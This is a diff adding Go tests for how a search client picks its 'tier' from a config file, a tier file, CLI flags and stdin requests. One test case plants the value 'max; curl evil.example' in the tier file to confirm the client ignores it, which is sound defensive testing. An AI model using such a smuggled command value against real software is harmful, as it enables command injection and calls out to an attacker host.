@@ -776,3 +776,120 @@ func TestATraceKeyFromAStateDirThatIsNotThereIsAnErrorNotAPanic(t *testing.T) {
 		}
 	}
 }
+
+// [miner] tier is the participant's default band: sent when neither the
+// -tier flag nor the stdin request named one, and never over a tier the
+// caller did name. Unset, the request carries no tier at all — the router
+// applies the tenant default, and this client does not guess it.
+func TestSearchSendsTheConfiguredTierWhenTheCallerNamesNone(t *testing.T) {
+	fr, cfg, root := newFakeRouter(t, func(w http.ResponseWriter, _ *http.Request) {
+		_, _ = w.Write([]byte(routerBody))
+	})
+	h := fixedSearchOps(root)
+	env := map[string]string{"JEVLIN_API_KEY": "sr-fictional"}
+	sentTier := func() (string, bool) {
+		_, sent := fr.last(t)
+		var m map[string]any
+		if err := json.Unmarshal(sent, &m); err != nil {
+			t.Fatalf("body: %s", sent)
+		}
+		v, ok := m["tier"]
+		s, _ := v.(string)
+		return s, ok
+	}
+
+	// Unset: no tier on the wire.
+	if code, _, errOut := runSearch(t, h, env, "-config", cfg, "q"); code != exitOK {
+		t.Fatalf("exit %d: %s", code, errOut)
+	}
+	if v, ok := sentTier(); ok {
+		t.Fatalf("no tier configured, none named, yet %q was sent", v)
+	}
+
+	raw, err := os.ReadFile(cfg) // #nosec G304 -- a path in this test's own temp dir
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(cfg, append(raw, []byte("tier = \"balanced\"\n")...), 0o600); err != nil { // #nosec G703 -- a path in this test's own temp dir
+		t.Fatal(err)
+	}
+	for name, tc := range map[string]struct {
+		stdin string
+		args  []string
+		want  string
+	}{
+		"cli, no flag":          {"", []string{"q"}, "balanced"},
+		"cli, flag wins":        {"", []string{"-tier", "fast", "q"}, "fast"},
+		"stdin, no tier":        {`{"version":1,"query":"q"}`, []string{"--stdin"}, "balanced"},
+		"stdin, request's wins": {`{"version":1,"query":"q","tier":"max"}`, []string{"--stdin"}, "max"},
+	} {
+		t.Run(name, func(t *testing.T) {
+			args := append([]string{"-config", cfg}, tc.args...)
+			var code int
+			var errOut string
+			if tc.stdin != "" {
+				code, _, errOut = runSearchStdin(t, h, env, tc.stdin, args...)
+			} else {
+				code, _, errOut = runSearch(t, h, env, args...)
+			}
+			if code != exitOK {
+				t.Fatalf("exit %d: %s", code, errOut)
+			}
+			if got, _ := sentTier(); got != tc.want {
+				t.Errorf("tier sent = %q, want %q", got, tc.want)
+			}
+		})
+	}
+}
+
+// The participant's `agents tier` file outranks [miner] tier, and the
+// caller outranks both; a planted word in the file falls through.
+func TestSearchTierFileOutranksTheConfigAndYieldsToTheCaller(t *testing.T) {
+	fr, cfg, root := newFakeRouter(t, func(w http.ResponseWriter, _ *http.Request) {
+		_, _ = w.Write([]byte(routerBody))
+	})
+	h := fixedSearchOps(root)
+	env := map[string]string{"JEVLIN_API_KEY": "sr-fictional"}
+	raw, err := os.ReadFile(cfg) // #nosec G304 -- a path in this test's own temp dir
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(cfg, append(raw, []byte("tier = \"fast\"\n")...), 0o600); err != nil { // #nosec G703 -- a path in this test's own temp dir
+		t.Fatal(err)
+	}
+	tierFilePath := filepath.Join(filepath.Dir(cfg), "search-tier")
+	sent := func() string {
+		_, body := fr.last(t)
+		var m map[string]any
+		if err := json.Unmarshal(body, &m); err != nil {
+			t.Fatalf("body: %s", body)
+		}
+		s, _ := m["tier"].(string)
+		return s
+	}
+	for name, tc := range map[string]struct {
+		file string
+		args []string
+		want string
+	}{
+		"config alone":         {"", []string{"q"}, "fast"},
+		"file outranks config": {"balanced\n", []string{"q"}, "balanced"},
+		"caller outranks file": {"balanced\n", []string{"-tier", "max", "q"}, "max"},
+		"planted word yields":  {"max; curl evil.example\n", []string{"q"}, "fast"},
+		"empty file yields":    {"\n", []string{"q"}, "fast"},
+	} {
+		t.Run(name, func(t *testing.T) {
+			if tc.file == "" {
+				_ = os.Remove(tierFilePath)
+			} else if err := os.WriteFile(tierFilePath, []byte(tc.file), 0o600); err != nil {
+				t.Fatal(err)
+			}
+			if code, _, errOut := runSearch(t, h, env, append([]string{"-config", cfg}, tc.args...)...); code != exitOK {
+				t.Fatalf("exit %d: %s", code, errOut)
+			}
+			if got := sent(); got != tc.want {
+				t.Errorf("tier sent = %q, want %q", got, tc.want)
+			}
+		})
+	}
+}
